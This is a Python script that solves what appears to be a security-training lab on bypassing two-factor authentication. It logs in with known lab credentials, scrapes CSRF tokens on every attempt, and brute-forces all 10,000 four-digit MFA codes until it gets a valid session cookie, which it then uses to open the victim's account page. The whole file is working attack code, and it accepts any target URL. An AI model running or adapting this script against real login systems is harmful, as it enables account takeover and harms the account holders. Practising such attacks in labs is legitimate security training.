"""
  Lab: 2FA bypass using brute-force attack

  Steps:
  1. Brute-force the MFA code and login as 'carlos:montoya' before each attempt to not be logged out
  2. After discovering the MFA code, access /my-account to finish the lab

  Author: N00BCYB0T
"""
import argparse
from bs4 import BeautifulSoup
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser(description="Lab: 2FA bypass using brute-force attack")
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g.: https://vulnerable.com/)")
    parser.add_argument("--proxy", help="Proxy (e.g.: http://127.0.0.1:8080)")
    args = parser.parse_args()

    url = args.url.strip('/')
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    print(f"{Fore.BLUE}Starting brute-force MFA...{Fore.RESET}")
    session_cookie = brute_force_mfa_code(url, proxies)

    if session_cookie:
        print(f"{Fore.YELLOW}Step 2.{Fore.RESET} Accessing 'carlos' account...")
        if access_my_account(url, session_cookie, proxies):
            print(f"{Fore.GREEN}[+] Lab Solved! Logged in as 'carlos'{Fore.RESET}")
        else:
            print(f"{Fore.RED}[-] Failed to access account. Check manually.{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Brute-force failed. MFA code not found.{Fore.RESET}")


def brute_force_mfa_code(url, proxies):
    for i in range(10000):
        mfa_code = f"{i:04d}"
        print(f"Trying MFA code {mfa_code}", end="\r", flush=True)

        try:
            # Step 1: GET /login (csrf + session)
            r = requests.get(f"{url}/login", proxies=proxies, verify=False, allow_redirects=False)
            if r.status_code != 200:
                print(f"{Fore.RED}[-] GET /login failed ({r.status_code}){Fore.RESET}")
                continue

            csrf = get_csrf_token(r.text)
            session_cookie = r.cookies.get('session')

            if not csrf or not session_cookie:
                print(f"{Fore.RED}[-] Missing CSRF or session from /login{Fore.RESET}")
                continue

            cookies = {'session': session_cookie}
            data = {'csrf': csrf, 'username': 'carlos', 'password': 'montoya'}

            # Step 2: POST /login (new session)
            login = requests.post(f"{url}/login", data=data, cookies=cookies,
                                  proxies=proxies, verify=False, allow_redirects=False)

            session_cookie = login.cookies.get('session')
            if login.status_code != 302 or not session_cookie:
                print(f"{Fore.RED}[-] Login failed ({login.status_code}){Fore.RESET}")
                continue

            cookies = {'session': session_cookie}

            # Step 3: GET /login2 (new csrf)
            r = requests.get(f"{url}/login2", cookies=cookies, proxies=proxies,
                             verify=False, allow_redirects=False)
            if r.status_code != 200:
                print(f"{Fore.RED}[-] GET /login2 failed ({r.status_code}){Fore.RESET}")
                continue

            csrf = get_csrf_token(r.text)
            if not csrf:
                print(f"{Fore.RED}[-] Missing CSRF from /login2{Fore.RESET}")
                continue

            # Step 4: POST /login2 with MFA code
            data = {'csrf': csrf, 'mfa-code': mfa_code}
            r = requests.post(f"{url}/login2", data=data, cookies=cookies,
                               proxies=proxies, verify=False, allow_redirects=False)

            if r.status_code == 302:
                print(f"\n{Fore.GREEN}[+] Found valid MFA code: {mfa_code}{Fore.RESET}")
                return r.cookies.get('session')

        except Exception as e:
            print(f"{Fore.RED}[-] Error on code {mfa_code}: {e}{Fore.RESET}")
            continue

    print(f"{Fore.RED}[-] MFA code not found{Fore.RESET}")
    return None


def access_my_account(url, session_cookie, proxies):
    try:
        cookies = {'session': session_cookie}
        r = requests.get(f"{url}/my-account", cookies=cookies,
                         proxies=proxies, verify=False, allow_redirects=False)

        if r.status_code == 200 and "Your username is: carlos" in r.text:
            return True
        return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error accessing my-account: {e}{Fore.RESET}")
        return False


def get_csrf_token(html):
    soup = BeautifulSoup(html, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})
    return csrf['value'] if csrf else None


if __name__ == "__main__":
    main()
